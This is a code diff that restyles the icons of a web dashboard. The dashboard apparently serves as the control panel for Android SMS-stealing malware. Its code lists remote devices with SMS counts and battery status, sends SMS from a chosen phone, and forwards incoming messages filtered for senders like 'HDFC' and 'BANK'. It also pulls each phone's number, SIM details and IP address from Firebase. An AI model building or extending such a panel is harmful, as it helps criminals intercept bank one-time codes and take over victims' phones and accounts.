+            <div><label><span class="i3d i3d-blue i3d-sm">📞</span> To Number</label><input type="tel" id="sendTo" placeholder="+919876543210"/></div>
+            <div><label><span class="i3d i3d-green i3d-sm">💬</span> Message</label><textarea id="sendMsg" placeholder="Type message here..."></textarea></div>
           </div>
-          <button class="btn-sm" onclick="sendSms()">📤 Send SMS to Device</button>
+          <button class="btn-sm" onclick="sendSms()"><span class="i3d i3d-green i3d-sm">📤</span> Send SMS to Device</button>
           <div id="sendStatus" style="margin-top:10px;font-family:'Space Mono',monospace;font-size:11px;"></div>
         </div>
         <div class="sec-title" style="margin:20px 0 10px">Sent <span>History</span></div>
@@ -437,14 +454,14 @@ header('Content-Type: text/html; charset=UTF-8');
             <input type="checkbox" id="fwToggle" onchange="toggleFw()" style="width:18px;height:18px;accent-color:var(--accent)"/>
           </div>
           <div class="input-group">
-            <div><label>📞 Forward To Number</label><input type="tel" id="fwNumber" placeholder="+919876543210"/></div>
+            <div><label><span class="i3d i3d-blue i3d-sm">📞</span> Forward To Number</label><input type="tel" id="fwNumber" placeholder="+919876543210"/></div>
             <div style="display:flex;align-items:center;gap:12px">
               <label style="margin:0;font-size:11px;color:var(--text)">Forward All SMS</label>
               <input type="checkbox" id="fwAll" checked onchange="document.getElementById('fwFilterDiv').style.display=this.checked?'none':'block'" style="width:18px;height:18px;accent-color:var(--accent)"/>
             </div>
             <div id="fwFilterDiv" style="display:none"><label>Filter Numbers (comma separated)</label><input type="text" id="fwFilters" placeholder="+9198..., HDFC, BANK"/></div>
           </div>
-          <button class="btn-sm" onclick="saveFw()">💾 Save Settings</button>
+          <button class="btn-sm" onclick="saveFw()"><span class="i3d i3d-purple i3d-sm">💾</span> Save Settings</button>
         </div>
         <div class="sec-title" style="margin:20px 0 10px">Forwarding <span>History</span></div>
         <div class="tbl-wrap"><table class="tbl"><thead><tr><th>From</th><th>To</th><th>Message</th><th>Time</th></tr></thead>
@@ -476,7 +493,7 @@ header('Content-Type: text/html; charset=UTF-8');
 <div class="modal-overlay hidden" id="firebaseModal" onclick="closeFirebaseModal(event)">
   <div class="modal-box modal-wide" onclick="event.stopPropagation()">
     <button class="modal-close" onclick="document.getElementById('firebaseModal').classList.add('hidden')">✕</button>
-    <div class="sec-title" style="margin-bottom:12px">🔥 Firebase <span>Manager</span></div>
+    <div class="sec-title" style="margin-bottom:12px"><span class="i3d i3d-fire">🔥</span> Firebase <span>Manager</span></div>
     <p style="color:var(--muted);font-size:11px;margin-bottom:14px">Add multiple Firebase projects — nodes auto-discovered &amp; fetched.</p>
     <div class="fb-list" id="fbList"></div>
     <div class="config-card" style="max-width:none;margin:0">
@@ -488,8 +505,8 @@ header('Content-Type: text/html; charset=UTF-8');
         <div><label>Project ID (optional)</label><input type="text" id="fbProject" placeholder="my-project"/></div>
       </div>
       <div style="display:flex;gap:10px;flex-wrap:wrap">
-        <button class="btn-sm" onclick="addFirebaseProject()">➕ Add Firebase</button>
-        <button class="btn-sm" style="background:linear-gradient(135deg,#333,#222)" onclick="refreshAllFirebase()">🔄 Refresh All</button>
+        <button class="btn-sm" onclick="addFirebaseProject()"><span class="i3d i3d-green i3d-sm">➕</span> Add Firebase</button>
+        <button class="btn-sm" style="background:linear-gradient(135deg,#333,#222)" onclick="refreshAllFirebase()"><span class="i3d i3d-blue i3d-sm">🔄</span> Refresh All</button>
       </div>
       <div id="fbAddStatus" style="margin-top:10px;font-family:'Space Mono',monospace;font-size:10px;color:var(--muted)"></div>
     </div>
@@ -532,7 +549,8 @@ var DEFAULT_FIREBASES=[{
 }];
 
 function setStatus(t,m){var p=document.getElementById('statusPill');p.className='status-pill'+(t==='connected'?' connected':'');document.getElementById('statusText').textContent=m;}
-function showFetchMs(ms){var el=document.getElementById('fetchMs');if(el)el.textContent=ms>=0?'⚡'+ms+'ms':'';}
+function ico(e,c){return '<span class="i3d'+(c?' '+c:'')+'">'+e+'</span>';}
+function showFetchMs(ms){var el=document.getElementById('fetchMs');if(el)el.innerHTML=ms>=0?ico('⚡','i3d-orange i3d-sm')+ms+'ms':'';}
 function makeDevKey(fbId,devId){return fbId+'::'+devId;}
 function parseDevKey(key){var i=String(key).indexOf('::');return i<0?{fbId:'',devId:key}:{fbId:key.slice(0,i),devId:key.slice(i+2)};}
 function getFbInstance(fbId){for(var i=0;i<firebaseInstances.length;i++)if(firebaseInstances[i].id===fbId)return firebaseInstances[i];return null;}
@@ -678,6 +696,7 @@ function applyFbTheme(fbId){
   var hues={'spinplay99':'255,60,60','rabel_raand':'123,47,255'};
   var h=hues[fbId]||String((fbId.charCodeAt(0)*17)%200+40)+',100,200';
   document.documentElement.style.setProperty('--glow','rgba('+h+',0.4)');
+  document.documentElement.style.setProperty('--icon-glow','rgba('+h+',0.75)');
 }
 function init3DScene(){
   var c=document.getElementById('particleCanvas');
@@ -935,7 +954,7 @@ function fetchDevicesCollection(inst,nodeName){
       var batch=keys.slice(idx,idx+batchSize);
       idx+=batchSize;
       var el=document.getElementById('devList');
-      if(el) el.innerHTML='<div class="dev-empty">⏳ '+inst.name+': '+Math.min(idx,keys.length)+'/'+keys.length+'</div>';
+      if(el) el.innerHTML='<div class="dev-empty">'+ico('⏳','i3d-blue i3d-lg')+'<br>'+esc(inst.name)+': '+Math.min(idx,keys.length)+'/'+keys.length+'</div>';
       if(!batch.length){ attachDeviceLiveListeners(inst,nodeName,keys); return; }
       return Promise.all(batch.map(function(id){return fetchOneDeviceSummary(inst,nodeName,id);})).then(function(rows){
         rows.forEach(function(row){
@@ -1094,7 +1113,7 @@ function renderSidebar(){
   var inst=getFbInstance(activeFbId);
   var list=getFilteredDevs().filter(function(d){return !q||(d.name+d.id+d.brand+d.rawId).toLowerCase().includes(q);});
   if(!list.length){
-    el.innerHTML='<div class="dev-empty">📡 '+(inst?esc(inst.name):'Firebase')+': No devices yet<br><span style="opacity:0.6;margin-top:6px;display:block">Loading or empty project</span></div>';
+    el.innerHTML='<div class="dev-empty">'+ico('📡','i3d-blue i3d-lg')+'<br>'+(inst?esc(inst.name):'Firebase')+': No devices yet<br><span style="opacity:0.6;margin-top:6px;display:block">Loading or empty project</span></div>';
     return;
   }
   window._sidebarList=list;
@@ -1103,7 +1122,7 @@ function renderSidebar(){
     return '<div class="dev-item'+(d.status==='online'?' is-online':'')+(d.id===selDev?' active':'')+'" onclick="openDeviceByIdx('+i+')">'+
       '<div class="dev-top"><span class="dev-name">'+esc(d.name)+'</span><span class="dev-dot '+d.status+'"></span></div>'+
       '<div class="dev-uid">'+esc(d.rawId.substring(0,20))+'...</div>'+
-      '<div class="dev-chips"><span class="dchip '+bc+'">⚡'+d.battery+'%'+(d.charging?' CHG':'')+'</span>'+
+      '<div class="dev-chips"><span class="dchip '+bc+'">'+ico('⚡','i3d-orange i3d-sm i3d-static')+d.battery+'%'+(d.charging?' CHG':'')+'</span>'+
       '<span class="dchip">'+esc(d.network)+'</span>'+
       '<span class="dchip">'+d.smsCount+' SMS</span>'+(d.status==="online"?'<span class="dchip" style="color:var(--success);border-color:rgba(0,255,157,0.2)">● ACTIVE</span>':'')+'</div></div>';
   }).join('');
@@ -1136,7 +1155,7 @@ function openDevice(id){
 
 function updateHero(d){
   document.getElementById('dName').textContent=d.name+(d.brand?' ('+d.brand+')':'');
-  document.getElementById('dBrand').textContent='Android '+d.android+' · 🔥 '+d.fbName;
+  document.getElementById('dBrand').innerHTML='Android '+d.android+' · '+ico('🔥','i3d-fire i3d-sm')+' '+esc(d.fbName);
   document.getElementById('dId').textContent='ID: '+d.rawId+' · node: '+d.deviceNode;
   var badge=document.getElementById('dBadge');
   badge.className='hero-badge '+d.status;
@@ -1186,10 +1205,11 @@ function loadRabelSim(dev){
   restPoll(dev.fbId,'clients/'+dev.rawId,function(data){
     var g=document.getElementById('simGrid');
     if(!data){g.innerHTML='<div style="color:var(--muted);font-family:Space Mono,monospace;font-size:10px">No device info</div>';return;}
-    var fields=[['📱 Model',data.modelName],['📞 Mobile',data.mobNo],['🔋 Battery',data.battery],['📶 Network',data.service_provider],['💾 Storage',data.storage],['🌐 IP',data.ip_address],['🤖 Android',data.androidV]];
-    if(data.sims&&data.sims.length) data.sims.forEach(function(sim,i){fields.push(['SIM '+(i+1),sim.carrierName+' · '+sim.phoneNumber]);});
+    var fields=[[ico('📱','i3d-blue i3d-sm'),'Model',data.modelName],[ico('📞','i3d-green i3d-sm'),'Mobile',data.mobNo],[ico('🔋','i3d-orange i3d-sm'),'Battery',data.battery],[ico('📶','i3d-fire i3d-sm'),'Network',data.service_provider],[ico('💾','i3d-purple i3d-sm'),'Storage',data.storage],[ico('🌐','i3d-blue i3d-sm'),'IP',data.ip_address],[ico('🤖','i3d-green i3d-sm'),'Android',data.androidV]];
+    if(data.sims&&data.sims.length) data.sims.forEach(function(sim,i){fields.push([ico('📲','i3d-green i3d-sm'),'SIM '+(i+1),sim.carrierName+' · '+sim.phoneNumber]);});
     g.innerHTML='<div class="sim-card">'+fields.map(function(f){
-      return '<div class="sim-row"><span class="sim-key">'+f[0]+'</span><span class="sim-val">'+(f[1]?esc(String(f[1])):'<span style="color:var(--muted)">N/A</span>')+'</span></div>';
+      var lbl=f.length>2?f[0]+' '+f[1]:f[0], val=f.length>2?f[2]:f[1];
+      return '<div class="sim-row"><span class="sim-key">'+lbl+'</span><span class="sim-val">'+(val?esc(String(val)):'<span style="color:var(--muted)">N/A</span>')+'</span></div>';
     }).join('')+'</div>';
   });
 }
@@ -1401,7 +1421,7 @@ function renderFirebaseList(){
     var nodes=inst&&inst.discoveredNodes.length?inst.discoveredNodes.join(', '):'discovering...';
     return '<div class="fb-item"><div><div class="fb-item-name">'+esc(cfg.name)+'</div>'+
       '<div class="fb-item-url">'+esc(cfg.databaseURL)+'</div>'+
-      '<div class="fb-item-nodes">📂 Nodes: '+esc(nodes)+'</div></div>'+
+      '<div class="fb-item-nodes">'+ico('📂','i3d-orange i3d-sm i3d-static')+' Nodes: '+esc(nodes)+'</div></div>'+
       (PROTECTED_FB_IDS.indexOf(cfg.id)<0?'<button class="fb-del" onclick="removeFirebaseProject(\''+cfg.id+'\')">✕</button>':'')+
       '</div>';
   }).join('');
